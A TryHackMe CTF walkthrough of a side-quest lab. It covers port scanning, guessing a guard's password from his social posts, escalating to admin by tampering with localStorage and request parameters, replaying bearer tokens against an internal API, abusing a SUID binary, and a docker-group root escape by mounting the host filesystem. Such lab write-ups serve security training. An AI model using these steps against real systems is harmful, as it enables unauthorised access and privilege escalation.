---
title: 'TryHackMe: The Great Disappearing Act'
author: Neo-Virex
categories: [TryHackMe]
tags: [Cheese, CTF, thm, Linux, Exploit]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_TGDA/
image:
  path: room-img.png
description: A detailed walkthrough of the  CTF challenge, covering reconnaissance, enumeration, exploitation, and privilege escalation.
---
# side-quest-1

![sq1.png](side-quest-1/abadb1ce-6dfb-4382-9303-e2e1317dd34e.png)

## Recon

```jsx
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 62
80/tcp    open  http       syn-ack ttl 62
8000/tcp  open  http-alt   syn-ack ttl 61
8080/tcp  open  http-proxy syn-ack ttl 62
9001/tcp  open  tor-orport syn-ack ttl 61
13400/tcp open  doip-data  syn-ack ttl 62
13401/tcp open  unknown    syn-ack ttl 62
13402/tcp open  unknown    syn-ack ttl 62
13403/tcp open  unknown    syn-ack ttl 62
13404/tcp open  unknown    syn-ack ttl 62
21337/tcp open  unknown    syn-ack ttl 62                                                                                                                                    

```

### ssh (22)

```jsx
PORT      STATE SERVICE            REASON         VERSION
22/tcp    open  ssh                syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7c:db:59:4d:59:4c:00:f3:2d:46:18:a0:0c:1a:6f:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwWMrumVjwOIuMJGYLo36bHX5R2FTJSS+FgjPP/d5Q0Q/HmU4f82njBn3QlGCUKsuNoE+11XyS48tzl+V8krEU=
|   256 db:07:34:f2:4a:de:cf:8f:ff:d6:29:68:26:34:06:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPiarAFFB0yDZgpJxhb7cvpMHCY7w41vqUYxJOhnBwEm
```

### http (80)

```jsx
80/tcp    open  http               syn-ack ttl 62 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: HopSec Asylum - Security Console

```

### http (8000)

```jsx
8000/tcp  open  http-alt           syn-ack ttl 61
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-title: Fakebook - Sign In
|_Requested resource was /accounts/login/?next=/posts/
...

```

There is a social-media-style login page, where I registered an account and logged in.

![2025-12-07_01-50.png](side-quest-1/2025-12-07_01-50.png)

### http (8080)

```jsx
8080/tcp  open  http               syn-ack ttl 62 SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: HopSec Asylum - Security Console
| http-methods: 
|_  Supported Methods: GET HEAD

```

### port (9001)

```jsx
9001/tcp  open  tor-orport?        syn-ack ttl 61
| fingerprint-strings: 
|   NULL: 
|     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1 
|     [AUTHORIZED PERSONNEL ONLY] 
|     WARNING: This system controls critical infrastructure
|     access attempts are logged and monitored
|     Unauthorized access will result in immediate termination
|     Authentication required to access SCADA terminal
|     Provide authorization token from Part 1 to proceed
|_    [AUTH] Enter authorization token:

```

I attempted to connect to the service using Netcat. 

```jsx
└─$ nc 10.80.130.189 9001   

╔═══════════════════════════════════════════════════════════════╗
║     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1          ║
║              [AUTHORIZED PERSONNEL ONLY]                      ║
╚═══════════════════════════════════════════════════════════════╝

[!] WARNING: This system controls critical infrastructure
[!] All access attempts are logged and monitored
[!] Unauthorized access will result in immediate termination

[!] Authentication required to access SCADA terminal
[!] Provide authorization token from Part 1 to proceed

[AUTH] Enter authorization token: 
```

The service prompted me for an authorization token.

### port (13400)

```jsx
13400/tcp open  hadoop-tasktracker syn-ack ttl 62 Apache Hadoop 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
| hadoop-tasktracker-info: 
|_  Logs: loginBtn
|_http-favicon: Unknown favicon MD5: 93B885ADFE0DA089CDF634904FD59F71
|_http-title: HopSec Asylum \xE2\x80\x93 Facility Video Portal
| hadoop-datanode-info: 
|_  Logs: loginBtn

```

![2025-12-07_01-49.png](side-quest-1/2025-12-07_01-49.png)

### nginx (13402)

```jsx
13402/tcp open  http               syn-ack ttl 62 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-cors: HEAD GET OPTIONS
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
```

### FUFF

```jsx
Fuzzing URL: http://10.81.187.90:13402/FUZZ
========================================================
                        [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 165ms]
index.html              [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 145ms]

```

### key page (21337)

```jsx
21337/tcp open  http               syn-ack ttl 62 Werkzeug httpd 3.0.1 (Python 3.12.3)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Unlock Hopper's Memories
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

### fuff

```jsx
========================================================
Fuzzing URL: http://10.81.187.90:21337/FUZZ
========================================================
                        [Status: 200, Size: 15547, Words: 3614, Lines: 360, Duration: 157ms]
unlock                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 151ms]

```

### other port (13401)

```jsx
13401/tcp open  http               syn-ack ttl 62 Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3

13403/tcp open  unknown            syn-ack ttl 62
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 07 Dec 2025 06:29:10 GMT
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 07 Dec 2025 06:29:06 GMT
|     Connection: close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 07 Dec 2025 06:29:07 GMT
|_    Connection: close

13404/tcp open  unknown            syn-ack ttl 62
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    unauthorized
```

## Web Enumeration

### port (8000)

creating the profile 

![2025-12-07_01-51.png](side-quest-1/8ef576a4-5c98-44d3-a3bf-935c44507dba.png)

On Posts i see `guard` is twitting we can find a lot of information about that guard.

![2025-12-07_01-53.png](side-quest-1/feeb2759-74dd-456a-b058-1d554063fb9c.png)

he share his password

![2025-12-07_02-02.png](side-quest-1/2fba7959-2f81-4be8-ab99-75c80d09f57f.png)

![2025-12-07_02-03.png](side-quest-1/c05673d9-c88e-4221-8e5d-a00f760deeb9.png)

![2025-12-07_02-09.png](side-quest-1/2e38d31d-5d19-449e-a83f-5c60a33a1573.png)

### info for the post

> guard.hopkins@hopsecasylum.com
> 

> Pizza1234$
> 

> Wareville
> 

> HopSec
> 

> 1982
> 

> Johnnyboy
> 
- based on this information let as try to creak the password for the guard email

### My braking point

**Password Cracking Strategy:**
Initially, I attempted to generate a custom wordlist by using **CeWL** to scrape the page and **Hashcat** to expand the list, but this approach did not yield the correct results.

After reviewing a great explanation from **Djalil Ayed**, I realized the logic was more targeted: I needed to manually craft a password based on specific user clues. My research indicated the password pattern consisted of a name, a birth year, and a special character. To crack it, I built a custom wordlist combining 'Johnny Boy' with his birth year and common symbols like **$** or **!**. This manual approach proved successful.

## Credentials

```jsx
guard.hopkins@hopsecasylum.com
```

```jsx
Johnnyboy1982!
```

Using this login

## Flag 1

![flag-1.png](side-quest-1/flag-1.png)

### **Exploitation:**

 The second room, `Psych`, required a key for access. I checked the other open ports to see if the gathered credentials would work elsewhere. By using the discovered email and password, I attempted to log into the Video Portal and it worked successfully.

![2025-12-07_01-49.png](side-quest-1/bad0b9a6-ffaa-44bf-bdd2-f4d24d9e717a.png)

### **Dashboard:**

The dashboard displays four video camera feeds; however, the psych room video is restricted. Currently, it is inaccessible to the guard user, as only admin have the permissions to view it.

![port13400.png](side-quest-1/port13400.png)

![ga.png](side-quest-1/ga.png)

### **Reconnaissance:**

I proceeded to investigate the page using the Developer Tools. I carefully analyzed the **Source Code** for hidden comments, monitored the **Network** tab for API requests, and inspected the **Storage** and **Console** tabs for sensitive data.

![videoportalcooke.png](side-quest-1/videoportalcooke.png)

Although the initial page appeared normal, I couldn't modify anything directly in the browser. However, upon inspecting the **`Local Storage**,` I discovered a value set to `guard`. By manually changing this value to `admin`, I successfully escalated my privileges and gained access to restricted features.

![admin-cooke.png](side-quest-1/8cde9c93-3a34-4240-85c9-37a6e4614280.png)

After reloading the page, the `Psych` video finally loaded, but it was identical to the others.

![guard-to-admin.png](side-quest-1/guard-to-admin.png)

### **Advanced Exploitation:**

I realized I needed to fully escalate my role to `admin` using a more advanced tool like **`Burp Suite`**. I used the proxy to intercept the web traffic, allowing me to analyze the **Request and Response** flow and modify the data in transit.

i start the proxy and flow the traffic to brupsuit 

![proxy.png](side-quest-1/proxy.png)

and i find the request for the `cam_admin`  and send it to the repeater and modify it  

![admin-repeter.png](side-quest-1/admin-repeter.png)

i try many way and this to git the request as admin but The technique I used, originally discovered by `Djalil Ayed`, involved adding `?tier=admin` to the request header.

![tier-admin.png](side-quest-1/tier-admin.png)

it respond with a `ticket_id` this id is the same as the guard id format so when i request  the video i will use this id. we can find the request link in the developer tool Network section when we play the video.

![hi.png](side-quest-1/hi.png)

I copied the stream URL and replaced the guard ticket ID with the `admin ticket ID.`

```jsx
http://10.81.190.165:13401/v1/streams/bf3e187a-2028-4374-b70d-8d7b87b0c898/manifest.m3u8
```

After modifying the URL, I attempted to open it in the browser, but it did not work. Instead, the stream needed to be opened using a network-capable media player such as `VLC.` 

![video.png](side-quest-1/video.png)

but if we understand the concept it is just replacing the id so we can you buresuit to play the video in the website like burpsuit have the fanction to modify the http heade it called `HTTP match and replace rule` 

![after-proxy-ch.png](side-quest-1/after-proxy-ch.png)

use this, the video play in the website. the bast way to modify the `http`

![change-proxy.png](side-quest-1/change-proxy.png)

## Flag (2)

ok lat go to the next flag in the video i found the pin to unlock the flag 

![2026-01-04_02-36.png](side-quest-1/2026-01-04_02-36.png)

However, this turned out to be only half of the flag.e. 

### Enumerating

After some analysis and reviewing walkthroughs, I recalled unusual comments observed earlier. in the video respond in the proxy 

![video-response.png](side-quest-1/video-response.png)

when i request the video it can with strings   **request:** 

```jsx
GET /v1/streams/2643bb9f-fa43-4c82-87d9-1d1f1bd99378/manifest.m3u8 HTTP/1.1
Host: 10.81.190.165:13401
```

> **respond :**
> 

```jsx
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Sun, 04 Jan 2026 07:15:03 GMT
Content-Type: application/vnd.apple.mpegurl
Content-Length: 123155
Cache-Control: no-store
Access-Control-Allow-Origin: http://10.81.190.165:13400
Vary: Origin
Access-Control-Allow-Headers: Authorization,Content-Type,Range
Access-Control-Allow-Methods: GET,POST,OPTIONS
Access-Control-Expose-Headers: Content-Range,Accept-Ranges
Connection: close

#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:8
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-START:TIME-OFFSET=0,PRECISE=YES
#EXT-X-SESSION-DATA:DATA-ID="hopsec.diagnostics",VALUE="/v1/ingest/diagnostics"
#EXT-X-DATERANGE:ID="hopsec-diag",CLASS="hopsec-diag",START-DATE="1970-01-01T00:00:00Z",
X-RTSP-EXAMPLE="rtsp://vendor-cam.test/cam-admin"
#EXT-X-SESSION-DATA:DATA-ID="hopsec.jobs",VALUE="/v1/ingest/jobs"
#EXTINF:8.333333,
/v1/streams/0fb90edf-ef9f-42a3-b23f-7a58874bdda7/seg/playlist000.ts?r=0
#EXTINF:1.566667,
...
```

And it is accessing two directory  

```jsx
/v1/ingest/diagnostics
/v1/ingest/jobs
```

try to see what they have request  using curl

```jsx
┌──(neo㉿neo)-[~/pro/ctf/side-quest-1]
└─$ curl http://10.81.190.165:13401/v1/ingest/diagnostics 
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

change it to `post` reques 

```jsx
┌──(neo㉿neo)-[~/pro/ctf/side-quest-1]
└─$ curl -X POST http://10.81.190.165:13401/v1/ingest/diagnostics
{"error":"unauthorized"}
                                                                                                                                    
┌──(neo㉿neo)-[~/pro/ctf/side-quest-1]
└─$ curl -X POST http://10.81.190.165:13401/v1/ingest/diagnostics
{"error":"unauthorized"}
                                                                                                 
```

it need authorization but the video is passing the request so in the video request we have the id and authentication 

![admin-repeter.png](side-quest-1/030b5598-742e-429c-8542-7094497a2c6e.png)

ok adding authentication 

```jsx
Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767508436}.3ba32121e770fccb933d54f1705dc33c34360a5a2771650dc00afcd737a1ee26
```

```jsx
┌──(neo㉿neo)-[~/pro/ctf/side-quest-1]
└─$ curl -X POST http://10.81.190.165:13401/v1/ingest/diagnostics \
> -H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767508436}.3ba32121e770fccb933d54f1705dc33c34360a5a2771650dc00afcd737a1ee26'
{"error":"invalid rtsp_url"}
```

`rtsp` is a protocol used to **stream audio/video in real time**

in the respond their is a rtsp we use this. and if you 

```jsx
┌──(neo㉿neo)-[~/pro/ctf/side-quest-1]
└─$ curl -X POST http://10.81.190.165:13401/v1/ingest/diagnostics \
-H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767508436}.3ba32121e770fccb933d54f1705dc33c34360a5a2771650dc00afcd737a1ee26' \
-d '{"rtsp_url":"rtsp://vendor-cam.test/cam-admin"}'
{"job_id":"857e389a-69f1-4de5-9485-c0589ab4a359","job_status":"/v1/ingest/jobs/857e389a-69f1-4de5-9485-c0589ab4a359"}
┌──(neo㉿neo)-[~/pro/ctf/side-quest-1]
└─$         
```

in this point this id i am real sure this id is for anther video but is is not i try it video in the browser and when i curl it is work 

```jsx
┌──(neo㉿neo)-[~]
└─$ curl http://10.82.146.15:13401/v1/ingest/jobs/1a979f15-4065-4d91-bf31-fe55c2c951f3
{"error":"unauthorized"}

┌──(neo㉿neo)-[~]
└─$
```

it return an unauthorization. this is good i git the authentication  and add it and curl it.

```jsx
└─$ curl http://10.82.146.15:13401/v1/ingest/jobs/1a979f15-4065-4d91-bf31-fe55c2c951f3 \
-H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767804483}.e45d59e4a8c417d8344f427656fbdd8474dd811f9adfe9ef98147a2acfb501ca'
{"console_port":13404,"rtsp_url":"rtsp://vendor-cam.test/cam-admin","status":"ready","token":"3fe38b19b0784acbb9a8f9307b99e1ed"}

```

it give as a hint and port. now i have the token that is good.

## Flag 2.5

```jsx
└─$ nc 10.81.153.8 13404
b7b44301ffbe4b83a46da8d3a9a1ed81
svc_vidops@tryhackme-2404:~$ ls
ls
api  hls  hls_data  media  rtsp-mock  spa  state
svc_vidops@tryhackme-2404:~$ 
```

### Enumerating

```jsx
svc_vidops@tryhackme-2404:~$ cd /
cd /
svc_vidops@tryhackme-2404:/$ ls
ls
bin		   etc		      lib64	  opt	sbin.usr-is-merged  usr
bin.usr-is-merged  home		      libx32	  proc	snap		    var
boot		   lib		      lost+found  root	srv
core		   lib.usr-is-merged  media	  run	sys
dev		   lib32	      mnt	  sbin	tmp
svc_vidops@tryhackme-2404:/$ cd home
cd home
svc_vidops@tryhackme-2404:/home$ ls
ls
dockermgr  svc_vidops  ubuntu
svc_vidops@tryhackme-2404:/home$ cd ubuntu
cd ubuntu
bash: cd: ubuntu: Permission denied
svc_vidops@tryhackme-2404:/home$ ls
ls
dockermgr  svc_vidops  ubuntu
svc_vidops@tryhackme-2404:/home$ cd ubuntu
cd ubuntu
bash: cd: ubuntu: Permission denied
svc_vidops@tryhackme-2404:/home$
svc_vidops@tryhackme-2404:/home$ ls -la
ls -la
total 20
drwxr-xr-x  5 root       root       4096 Nov 27 09:02 .
drwxr-xr-x 22 root       root       4096 Jan  4 08:31 ..
drwxr-x---  2 dockermgr  dockermgr  4096 Nov 27 09:02 dockermgr
drwxr-x---  2 svc_vidops svc_vidops 4096 Nov 24 10:18 svc_vidops
drwx------ 14 ubuntu     ubuntu     4096 Dec  3 15:33 ubuntu
svc_vidops@tryhackme-2404:/home$ cd svc_vidops
cd svc_vidops
svc_vidops@tryhackme-2404:/home/svc_vidops$ ls
ls
user_part2.txt
svc_vidops@tryhackme-2404:/home/svc_vidops$ cat user_part2.txt
cat user_part2.txt
j3stered_739138}
svc_vidops@tryhackme-2404:/home/svc_vidops$
   
```

I searched for anything unusual, specifically files running with root privileges.

```jsx
svc_vidops@tryhackme-2404:/home/svc_vidops$ find / -type f -perm /4000 2>/dev/null
</svc_vidops$ find / -type f -perm /4000 2>/dev/null
/snap/core20/2682/usr/bin/chfn
/snap/core20/2682/usr/bin/chsh
/snap/core20/2682/usr/bin/gpasswd
/snap/core20/2682/usr/bin/mount
/snap/core20/2682/usr/bin/newgrp
/snap/core20/2682/usr/bin/passwd
/snap/core20/2682/usr/bin/su
/snap/core20/2682/usr/bin/sudo
/snap/core20/2682/usr/bin/umount
/snap/core20/2682/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2682/usr/lib/openssh/ssh-keysign
/snap/core20/2669/usr/bin/chfn
/snap/core20/2669/usr/bin/chsh
/snap/core20/2669/usr/bin/gpasswd
/snap/core20/2669/usr/bin/mount
/snap/core20/2669/usr/bin/newgrp
/snap/core20/2669/usr/bin/passwd
/snap/core20/2669/usr/bin/su
/snap/core20/2669/usr/bin/sudo
/snap/core20/2669/usr/bin/umount
/snap/core20/2669/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2669/usr/lib/openssh/ssh-keysign
/snap/core24/1225/usr/bin/chfn
/snap/core24/1225/usr/bin/chsh
/snap/core24/1225/usr/bin/gpasswd
/snap/core24/1225/usr/bin/mount
/snap/core24/1225/usr/bin/newgrp
/snap/core24/1225/usr/bin/passwd
/snap/core24/1225/usr/bin/su
/snap/core24/1225/usr/bin/sudo
/snap/core24/1225/usr/bin/umount
/snap/core24/1225/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1225/usr/lib/openssh/ssh-keysign
/snap/core24/1225/usr/lib/polkit-1/polkit-agent-helper-1
/snap/core/17247/bin/mount
/snap/core/17247/bin/ping
/snap/core/17247/bin/ping6
/snap/core/17247/bin/su
/snap/core/17247/bin/umount
/snap/core/17247/usr/bin/chfn
/snap/core/17247/usr/bin/chsh
/snap/core/17247/usr/bin/gpasswd
/snap/core/17247/usr/bin/newgrp
/snap/core/17247/usr/bin/passwd
/snap/core/17247/usr/bin/sudo
/snap/core/17247/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/17247/usr/lib/openssh/ssh-keysign
/snap/core/17247/usr/lib/snapd/snap-confine
/snap/core/17247/usr/sbin/pppd
/snap/core18/2959/bin/mount
/snap/core18/2959/bin/ping
/snap/core18/2959/bin/su
/snap/core18/2959/bin/umount
/snap/core18/2959/usr/bin/chfn
/snap/core18/2959/usr/bin/chsh
/snap/core18/2959/usr/bin/gpasswd
/snap/core18/2959/usr/bin/newgrp
/snap/core18/2959/usr/bin/passwd
/snap/core18/2959/usr/bin/sudo
/snap/core18/2959/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2959/usr/lib/openssh/ssh-keysign
/snap/core18/2976/bin/mount
/snap/core18/2976/bin/ping
/snap/core18/2976/bin/su
/snap/core18/2976/bin/umount
/snap/core18/2976/usr/bin/chfn
/snap/core18/2976/usr/bin/chsh
/snap/core18/2976/usr/bin/gpasswd
/snap/core18/2976/usr/bin/newgrp
/snap/core18/2976/usr/bin/passwd
/snap/core18/2976/usr/bin/sudo
/snap/core18/2976/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2976/usr/lib/openssh/ssh-keysign
/snap/core22/2139/usr/bin/chfn
/snap/core22/2139/usr/bin/chsh
/snap/core22/2139/usr/bin/gpasswd
/snap/core22/2139/usr/bin/mount
/snap/core22/2139/usr/bin/newgrp
/snap/core22/2139/usr/bin/passwd
/snap/core22/2139/usr/bin/su
/snap/core22/2139/usr/bin/sudo
/snap/core22/2139/usr/bin/umount
/snap/core22/2139/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/2139/usr/lib/openssh/ssh-keysign
/snap/core22/2139/usr/libexec/polkit-agent-helper-1
/snap/core22/2163/usr/bin/chfn
/snap/core22/2163/usr/bin/chsh
/snap/core22/2163/usr/bin/gpasswd
/snap/core22/2163/usr/bin/mount
/snap/core22/2163/usr/bin/newgrp
/snap/core22/2163/usr/bin/passwd
/snap/core22/2163/usr/bin/su
/snap/core22/2163/usr/bin/sudo
/snap/core22/2163/usr/bin/umount
/snap/core22/2163/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/2163/usr/lib/openssh/ssh-keysign
/snap/core22/2163/usr/libexec/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/mount
/usr/local/bin/diag_shell
svc_vidops@tryhackme-2404:/home/svc_vidops$
```

One unusual binary stood out: `diag_shell.` 

```jsx
svc_vidops@tryhackme-2404:/home/svc_vidops$ ls -la /usr/local/bin/diag_shell
ls -la /usr/local/bin/diag_shell
-rwsr-xr-x 1 dockermgr dockermgr 16056 Nov 27 16:31 /usr/local/bin/diag_shell
svc_vidops@tryhackme-2404:/home/svc_vidops$ file /usr/local/bin/diag_shell
file /usr/local/bin/diag_shell
/usr/local/bin/diag_shell: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8039c3fc4e45890bcfb369620c6f6654d5ae5151, for GNU/Linux 3.2.0, not stripped
svc_vidops@tryhackme-2404:/home/svc_vidops$
```

i use strings on the binary and give the output to chatgpt to tell me what the scrip do 

![ai.png](side-quest-1/ai.png)

it say it is used to change or switch user and groups so let run the script 

```jsx
svc_vidops@tryhackme-2404:/home/svc_vidops$ /usr/local/bin/diag_shell
/usr/local/bin/diag_shell
dockermgr@tryhackme-2404:/home/svc_vidops$ id 
id
uid=1501(dockermgr) gid=1500(svc_vidops) groups=1500(svc_vidops)
dockermgr@tryhackme-2404:/home/svc_vidops$
```

```jsx
dockermgr@tryhackme-2404:/home/svc_vidops$ cd ..
cd ..
dockermgr@tryhackme-2404:/home$ ls
ls
dockermgr  svc_vidops  ubuntu
dockermgr@tryhackme-2404:/home$ cd dockermgr
cd dockermgr
dockermgr@tryhackme-2404:/home/dockermgr$ ls
ls
dockermgr@tryhackme-2404:/home/dockermgr$ ls -la
ls -la
total 20
drwxr-x--- 2 dockermgr dockermgr 4096 Nov 27 09:02 .
drwxr-xr-x 5 root      root      4096 Nov 27 09:02 ..
-rw-r--r-- 1 dockermgr dockermgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 dockermgr dockermgr 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 dockermgr dockermgr  807 Feb 25  2020 .profile
dockermgr@tryhackme-2404:/home/dockermgr
```

I switched from the svc_vidops user to dockermgr for the name we we understand is is is about docker management lat start running docker commands.

```jsx
dockermgr@tryhackme-2404:~$ sg docker -c "docker ps"
sg docker -c "docker ps"
CONTAINER ID   IMAGE                       COMMAND                  CREATED       STATUS             PORTS                                         NAMES
1cbf40c715f4   side-quest-2-asylum-scada   "python3 /opt/scada/…"   5 weeks ago   Up About an hour   0.0.0.0:9001->9001/tcp, [::]:9001->9001/tcp   asylum_gate_control
dockermgr@tryhackme-2404:~$ 

```

try to connect to the container  as root 

```jsx
dockermgr@tryhackme-2404:~$ sg docker -c "docker run --user root -v /:/host --rm -it side-quest-2-asylum-scada /bin/bash"
</host --rm -it side-quest-2-asylum-scada /bin/bash"
**root@f9d0ef29a754:/opt/scada# id
id
uid=0(root) gid=0(root) groups=0(root)
root@f9d0ef29a754:/opt/scada#** 

```

now i am root you can see every thing for the backend 

### Root Enumeration

```jsx
root@df9547533425:/opt/scada# ls 
ls
gate_controller.sh  scada_terminal.py
root@df9547533425:/opt/scada#cd /root
root@df9547533425:~# ls -la
ls -la
total 20
drwx------ 1 root root 4096 Nov 27 08:55 .
drwxr-xr-x 1 root root 4096 Jan  4 09:12 ..
drwx------ 2 root root 4096 Nov 27 08:55 .asylum
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
root@df9547533425:~# cd .asylum
cd .asylum
root@df9547533425:~/.asylum# ls
ls
unlock_code
root@df9547533425:~/.asylum# cat unlock_code
cat unlock_code
739184627
root@df9547533425:~/.asylum# 

```

## Flag 3

we have the key 

![flag3.png](side-quest-1/flag3.png)

in this point i have the back door so i can see how the ctf work, spaciously what key it accesspt , now go back to the /opt/scada/

```jsx
root@df9547533425:/opt/scada# ls 
ls
gate_controller.sh  scada_terminal.py
root@df9547533425:/opt/scada# cat gate_controller.sh
cat gatte_controller.sh
cat: gatte_controller.sh: No such file or directory
root@df9547533425:/opt/scada# cat gate_controller.sh
cat gate_controller.sh
#!/bin/bash
# Asylum Gate Controller - Utility Script
# This script can be used to interact with the gate system

echo "Asylum Gate Controller Utility"
echo "=============================="
echo ""
echo "Current gate status can be checked via the SCADA terminal"
echo "Connect to port 9001 to access the terminal interface"
echo ""
root@df9547533425:/opt/scada#
```

```jsx
root@df9547533425:/opt/scada# cat scada_terminal.py
cat scada_terminal.py
#!/usr/bin/env python3
"""
Asylum Gate Control System - SCADA Terminal
Authorized Personnel Only
"""

import socket
import threading
import sys
import subprocess
import os

# Banner
BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1          ║
║              [AUTHORIZED PERSONNEL ONLY]                      ║
╚═══════════════════════════════════════════════════════════════╝
...

```

### The script in short function

> SCADA terminal server running on port 9001
> 

> Requires Part 1 flag as an authentication token
> 

> Start TCP server and wait for client connection
> 

> Ask user for authorization token (THM flag)
> 

> If token is valid → grant access to SCADA terminal
> 

> Provide commands: status, info, lock, unlock, exit
> 

> Gate unlock requires a specific numeric code
> 

> Code can be entered directly or read from a file
> 

> If correct code is supplied → gate status changes to UNLOCKED
> 

> Successful unlock represents escaping the asylum
> 

### At this point, I had obtained all three flags and moved on to the final challenge.

![2026-01-04_04-23.png](side-quest-1/2026-01-04_04-23.png)

we have been provide as with a link and invitation 

## **How SOC-mas became EAST-mas: Hopper's Origins**

i visited the website and it is a challenge too  

```jsx
https://static-labs.tryhackme.cloud/apps/hoppers-invitation/
```

I inter the flag `THM{[REDACTED]ithout.Hopper}`

It dose not work

![look.png](side-quest-1/look.png)

I check the developer and analyze the code and network.

![data1.png](side-quest-1/data1.png)

there is a request to `hopper-origins.txt` 

![data.png](side-quest-1/data.png)

```jsx
https://assets.tryhackme.com/additional/aoc2025/files/hopper-origins.txt
```

```jsx
hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI
```

we have the `js` it have what we need 

```jsx
https://static-labs.tryhackme.cloud/apps/hoppers-invitation/assets/index-C4-4uPfO.js
```

this is the code that decrpt the encrption 

```jsx
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const jd=e=>e.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase().trim(),Do=(e,t)=>{const n=he.forwardRef(({color:r="currentColor",size:l=24,strokeWidth:u=2,absoluteStrokeWidth:o,className:i="",children:s,...f},h)=>he.createElement("svg",{ref:h,...Rd,width:l,height:l,stroke:r,strokeWidth:o?Number(u)*24/Number(l):u,className:["lucide",`lucide-${jd(e)}`,i].join(" "),...f},[...t.map(([m,p])=>he.createElement(m,p)),...Array.isArray(s)?s:[s]]));return n.displayName=`${e}`,n};/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Dd=Do("Clock",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polyline",{points:"12 6 12 12 16 14",key:"68esgv"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
